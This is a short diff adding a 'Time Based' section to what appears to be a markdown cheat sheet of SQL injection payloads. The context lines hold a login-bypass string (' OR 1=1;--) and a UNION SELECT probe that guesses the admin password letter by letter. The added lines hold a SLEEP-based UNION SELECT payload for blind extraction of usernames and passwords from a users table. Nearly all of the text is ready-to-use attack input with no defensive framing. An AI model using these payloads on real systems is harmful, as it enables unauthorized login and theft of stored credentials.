@@ -55,3 +55,8 @@ password: ' OR 1=1;--
 ```
 ' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%
 ```
+# Time Based
+#### This will guess for the correct username and password in users table
+```
+' UNION SELECT SLEEP(2),2 from users where username like 'ad%in' and password like '49%1';--
+```
